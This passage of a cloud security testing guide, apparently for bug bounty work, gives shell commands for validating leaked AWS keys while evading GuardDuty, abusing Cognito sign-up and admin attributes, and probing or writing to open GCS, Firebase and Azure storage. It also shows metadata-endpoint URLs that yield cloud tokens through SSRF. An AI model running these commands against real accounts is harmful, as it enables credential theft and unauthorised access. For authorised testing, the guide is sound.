+</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="nb">export</span><span class="w"> </span><span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span><span class="s2">&quot;ASIA...&quot;</span>
+</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="nb">export</span><span class="w"> </span><span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span><span class="s2">&quot;...&quot;</span>
+</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="nb">export</span><span class="w"> </span><span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span><span class="s2">&quot;...&quot;</span>
+</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>
+</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>aws<span class="w"> </span>sts<span class="w"> </span>get-caller-identity
+</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>aws<span class="w"> </span>iam<span class="w"> </span>list-attached-role-policies<span class="w"> </span>--role-name<span class="w"> </span>&lt;role&gt;
+</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>aws<span class="w"> </span>s3<span class="w"> </span>ls
+</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>aws<span class="w"> </span>secretsmanager<span class="w"> </span>list-secrets
+</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>aws<span class="w"> </span>ssm<span class="w"> </span>describe-parameters
+</span></code></pre></div>
+<hr />
+<h3 id="exposed-aws-keys">Exposed AWS Keys<a class="headerlink" href="#exposed-aws-keys" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> Keys surface in JS files, <code>.env</code> files, GitHub commits, or accessible S3 buckets during recon.</p>
+<div class="language-bash highlight"><span class="filename">aws_key_validation.sh</span><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># Key formats: AKIA... (long-term), ASIA... (STS temporary)</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="c1"># Validate:</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>aws<span class="w"> </span>sts<span class="w"> </span>get-caller-identity<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="w">  </span>--access-key-id<span class="w"> </span><span class="s2">&quot;AKIA...&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="w">  </span>--secret-access-key<span class="w"> </span><span class="s2">&quot;...&quot;</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="c1"># Account ID returned = valid key = Critical</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="c1"># Enumerate permissions without triggering GuardDuty (read-only):</span>
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>python3<span class="w"> </span>enumerate-iam.py<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="w">  </span>--access-key<span class="w"> </span>AKIA...<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="w">  </span>--secret-key<span class="w"> </span>...<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="w">  </span>--region<span class="w"> </span>us-east-1
+</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>
+</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>aws<span class="w"> </span>iam<span class="w"> </span>get-user
+</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>aws<span class="w"> </span>iam<span class="w"> </span>list-groups-for-user<span class="w"> </span>--user-name<span class="w"> </span>&lt;user&gt;
+</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>aws<span class="w"> </span>iam<span class="w"> </span>list-attached-user-policies<span class="w"> </span>--user-name<span class="w"> </span>&lt;user&gt;
+</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>aws<span class="w"> </span>s3<span class="w"> </span>ls
+</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>aws<span class="w"> </span>ec2<span class="w"> </span>describe-instances<span class="w"> </span>--region<span class="w"> </span>us-east-1
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Report field</th>
+<th>What to include</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Key ID</td>
+<td>First 10 characters only</td>
+</tr>
+<tr>
+<td>Secret key</td>
+<td>First 4 characters + <code>***</code></td>
+</tr>
+<tr>
+<td>Evidence</td>
+<td><code>aws sts get-caller-identity</code> output</td>
+</tr>
+<tr>
+<td>Permissions</td>
+<td>Role/user policies, what was accessible</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition danger">
+<p class="admonition-title">Danger</p>
+<p>Stop at read-only confirmation. Do not attempt privilege escalation, lateral movement, or any write/destructive action. <code>sts get-caller-identity</code> plus a permissions list is sufficient evidence for Critical severity.</p>
+</div>
+<hr />
+<h3 id="cognito-misconfiguration">Cognito Misconfiguration<a class="headerlink" href="#cognito-misconfiguration" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> Target uses AWS Cognito for authentication — User Pool IDs and App Client IDs visible in JS or mobile app bundles.</p>
+<div class="language-bash highlight"><span class="filename">cognito_enum.sh</span><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="c1"># Locate Cognito identifiers in JS:</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>grep<span class="w"> </span>-rE<span class="w"> </span><span class="s2">&quot;us-east-1_[A-Za-z0-9]+&quot;</span><span class="w"> </span>./js_files/<span class="w">    </span><span class="c1"># User Pool ID</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>grep<span class="w"> </span>-rE<span class="w"> </span><span class="s1">&#39;&quot;[0-9a-z]{26}&quot;&#39;</span><span class="w"> </span>./js_files/<span class="w">              </span><span class="c1"># App Client ID</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="c1"># Test unauthenticated identity pool access:</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>aws<span class="w"> </span>cognito-identity<span class="w"> </span>get-id<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="w">  </span>--account-id<span class="w"> </span>&lt;account_id&gt;<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="w">  </span>--identity-pool-id<span class="w"> </span>us-east-1:xxxxxxxx<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a><span class="w">  </span>--region<span class="w"> </span>us-east-1
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>aws<span class="w"> </span>cognito-identity<span class="w"> </span>get-credentials-for-identity<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="w">  </span>--identity-id<span class="w"> </span>us-east-1:xxxxxxxx<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="w">  </span>--region<span class="w"> </span>us-east-1
+</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="c1"># Credentials returned = unauthenticated AWS access</span>
+</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>
+</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="c1"># Test open self-registration:</span>
+</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>aws<span class="w"> </span>cognito-idp<span class="w"> </span>sign-up<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a><span class="w">  </span>--client-id<span class="w"> </span>&lt;app_client_id&gt;<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-5-19"><a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="w">  </span>--username<span class="w"> </span>attacker@evil.com<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-5-20"><a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a><span class="w">  </span>--password<span class="w"> </span>Password123!<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-5-21"><a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a><span class="w">  </span>--region<span class="w"> </span>us-east-1
+</span><span id="__span-5-22"><a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a>
+</span><span id="__span-5-23"><a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a><span class="c1"># Test admin attribute manipulation on your own account:</span>
+</span><span id="__span-5-24"><a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a>aws<span class="w"> </span>cognito-idp<span class="w"> </span>update-user-attributes<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-5-25"><a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a><span class="w">  </span>--access-token<span class="w"> </span>&lt;your_token&gt;<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-5-26"><a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a><span class="w">  </span>--user-attributes<span class="w"> </span><span class="nv">Name</span><span class="o">=</span>custom:role,Value<span class="o">=</span>admin<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-5-27"><a id="__codelineno-5-27" name="__codelineno-5-27" href="#__codelineno-5-27"></a><span class="w">  </span>--region<span class="w"> </span>us-east-1
+</span></code></pre></div>
+<hr />
+<h2 id="google-cloud-platform-gcp">Google Cloud Platform (GCP)<a class="headerlink" href="#google-cloud-platform-gcp" title="Permanent link">&para;</a></h2>
+<h3 id="gcs-bucket-misconfiguration">GCS Bucket Misconfiguration<a class="headerlink" href="#gcs-bucket-misconfiguration" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> Any GCP-hosted target, or when JS files reference <code>storage.googleapis.com</code> or <code>gs://</code> URLs.</p>
+<div class="language-bash highlight"><span class="filename">gcs_enum.sh</span><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># Unauthenticated access checks:</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;https://storage.googleapis.com/target-bucket&quot;</span><span class="w">          </span><span class="c1"># XML listing = Critical</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;https://storage.googleapis.com/target-bucket/config.json&quot;</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="c1"># gsutil (no auth):</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>gsutil<span class="w"> </span>ls<span class="w"> </span>gs://target-bucket
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>gsutil<span class="w"> </span>cat<span class="w"> </span>gs://target-bucket/.env
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>gsutil<span class="w"> </span>cp<span class="w"> </span>test.txt<span class="w"> </span>gs://target-bucket/<span class="w">    </span><span class="c1"># write test</span>
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="c1"># Bucket name discovery:</span>
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>python3<span class="w"> </span>GCPBucketBrute.py<span class="w"> </span>--keyword<span class="w"> </span>target<span class="w"> </span>--out<span class="w"> </span>gcs_results.txt
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>
+</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="c1"># Find GCS references in JS:</span>
+</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>grep<span class="w"> </span>-rE<span class="w"> </span><span class="s1">&#39;&quot;gs://[^&quot;]+&quot;&#39;</span><span class="w"> </span>./js_files/
+</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>grep<span class="w"> </span>-rE<span class="w"> </span><span class="s1">&#39;storage\.googleapis\.com/[^&quot;]+&#39;</span><span class="w"> </span>./js_files/
+</span></code></pre></div>
+<hr />
+<h3 id="firebase-exposed-databases">Firebase Exposed Databases<a class="headerlink" href="#firebase-exposed-databases" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> Target uses Firebase — <code>firebaseio.com</code> domain or <code>firebaseConfig</code> object in JS source.</p>
+<p>Firebase Realtime Database defaults to open read/write rules in development, and those settings frequently reach production.</p>
+<div class="language-bash highlight"><span class="filename">firebase_enum.sh</span><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># Check for public read access:</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;https://target-default-rtdb.firebaseio.com/.json&quot;</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="c1"># Any JSON response = entire database readable = Critical</span>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="c1"># Common URL variations:</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="c1"># https://&lt;project-id&gt;.firebaseio.com/.json</span>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="c1"># https://&lt;project-id&gt;-default-rtdb.firebaseio.com/users.json</span>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="c1"># https://&lt;project-id&gt;-default-rtdb.firebaseio.com/admin.json</span>
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>
+</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="c1"># Extract project ID from JS:</span>
+</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>grep<span class="w"> </span>-rE<span class="w"> </span><span class="s1">&#39;&quot;databaseURL&quot;: &quot;https://[^&quot;]+&quot;&#39;</span><span class="w"> </span>./js_files/
+</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>grep<span class="w"> </span>-rE<span class="w"> </span><span class="s1">&#39;&quot;projectId&quot;: &quot;[^&quot;]+&quot;&#39;</span><span class="w"> </span>./js_files/
+</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>
+</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a><span class="c1"># Test write access:</span>
+</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a>curl<span class="w"> </span>-s<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a><span class="w">  </span><span class="s2">&quot;https://target-default-rtdb.firebaseio.com/test.json&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-7-17"><a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a><span class="w">  </span>-d<span class="w"> </span><span class="s1">&#39;&quot;pwned&quot;&#39;</span>
+</span><span id="__span-7-18"><a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a><span class="c1"># &quot;pwned&quot; returned = public write access = Critical</span>
+</span></code></pre></div>
+<hr />
+<h3 id="gcp-metadata-endpoint">GCP Metadata Endpoint<a class="headerlink" href="#gcp-metadata-endpoint" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> SSRF on a GCP-hosted target. Requires the <code>Metadata-Flavor: Google</code> header.</p>
+<div class="language-bash highlight"><span class="filename">gcp_metadata_ssrf.sh</span><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="c1"># Service account OAuth token:</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="c1"># Project and instance context:</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>http://metadata.google.internal/computeMetadata/v1/project/project-id
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>http://metadata.google.internal/computeMetadata/v1/instance/attributes/
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="c1"># Instance attributes often contain startup scripts, SSH keys, and credentials</span>
+</span></code></pre></div>
+<hr />
+<h2 id="microsoft-azure">Microsoft Azure<a class="headerlink" href="#microsoft-azure" title="Permanent link">&para;</a></h2>
+<h3 id="azure-blob-storage-misconfiguration">Azure Blob Storage Misconfiguration<a class="headerlink" href="#azure-blob-storage-misconfiguration" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> Azure-hosted targets, or when DNS or JS reveals <code>blob.core.windows.net</code> hostnames.</p>
+<div class="language-bash highlight"><span class="filename">azure_blob_enum.sh</span><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c1"># Check for public container listing:</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;https://targetaccount.blob.core.windows.net/container?restype=container&amp;comp=list&quot;</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="c1"># XML listing returned = public access enabled</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="c1"># Find storage account references in JS:</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>grep<span class="w"> </span>-rE<span class="w"> </span><span class="s2">&quot;[a-z0-9]+\.blob\.core\.windows\.net&quot;</span><span class="w"> </span>./js_files/
+</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>
+</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="c1"># BlobHunter: automated discovery across an organization&#39;s namespace</span>
+</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>python3<span class="w"> </span>BlobHunter.py<span class="w"> </span>-a<span class="w"> </span>targetcompany
+</span></code></pre></div>
+<hr />
+<h3 id="azure-metadata-endpoint">Azure Metadata Endpoint<a class="headerlink" href="#azure-metadata-endpoint" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> SSRF on an Azure-hosted target. Requires the <code>Metadata: true</code> header.</p>
+<div class="language-bash highlight"><span class="filename">azure_metadata_ssrf.sh</span><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c1"># Instance metadata:</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>http://169.254.169.254/metadata/instance?api-version<span class="o">=</span><span class="m">2021</span>-02-01
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="c1"># Management API token:</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>http://169.254.169.254/metadata/identity/oauth2/token?api-version<span class="o">=</span><span class="m">2018</span>-02-01<span class="p">&amp;</span><span class="nv">resource</span><span class="o">=</span>https://management.azure.com/
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="c1"># access_token returned = Azure management API access = Critical</span>
+</span></code></pre></div>
+<hr />
+<h2 id="generic-cloud-recon">Generic Cloud Recon<a class="headerlink" href="#generic-cloud-recon" title="Permanent link">&para;</a></h2>
+<h3 id="cloud-asset-discovery">Cloud Asset Discovery<a class="headerlink" href="#cloud-asset-discovery" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> Early in recon when the target's cloud footprint is unknown.</p>
+<div class="language-bash highlight"><span class="filename">cloud_fingerprint.sh</span><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="c1"># Provider fingerprinting by hostname pattern:</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="c1"># AWS:   *.amazonaws.com, *.cloudfront.net, *.elb.amazonaws.com</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="c1"># GCP:   *.googleapis.com, *.appspot.com, *.run.app, *.cloudfunctions.net</span>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="c1"># Azure: *.azurewebsites.net, *.blob.core.windows.net, *.azure.com</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="c1"># Flag cloud-hosted endpoints in httpx output:</span>
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>cat<span class="w"> </span>httpx_out.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-iE<span class="w"> </span><span class="s2">&quot;amazonaws|googleapis|azurewebsites|cloudfront|heroku&quot;</span>
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="c1"># CloudEnum: multi-cloud bucket + asset discovery</span>
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>python3<span class="w"> </span>cloud_enum.py<span class="w"> </span>-k<span class="w"> </span>targetcompany
+</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>
+</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a><span class="c1"># Certificate transparency for cloud-hosted assets:</span>
+</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;https://crt.sh/?q=%.amazonaws.com&amp;output=json&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a><span class="w">  </span>jq<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;.[].name_value&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;target&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Provider</th>
+<th>Asset types CloudEnum checks</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>AWS</td>
+<td>S3 buckets, Lambda URLs</td>
+</tr>
+<tr>
+<td>GCP</td>
+<td>GCS buckets, Cloud Functions, App Engine</td>
+</tr>
+<tr>
+<td>Azure</td>
+<td>Blob storage, Azure websites, Functions</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="nuclei-cloud-templates">Nuclei Cloud Templates<a class="headerlink" href="#nuclei-cloud-templates" title="Permanent link">&para;</a></h3>
+<p><strong>When to use:</strong> After initial asset discovery — run against all discovered hosts.</p>
+<div class="language-bash highlight"><span class="filename">nuclei_cloud.sh</span><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1"># Broad cloud misconfiguration sweep:</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>nuclei<span class="w"> </span>-l<span class="w"> </span>discovered_hosts.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="w">  </span>-t<span class="w"> </span>exposures/configs/<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="w">  </span>-t<span class="w"> </span>exposures/files/<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="w">  </span>-t<span class="w"> </span>cloud/<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="w">  </span>-severity<span class="w"> </span>medium,high,critical<span class="w"> </span><span class="se">\</span>
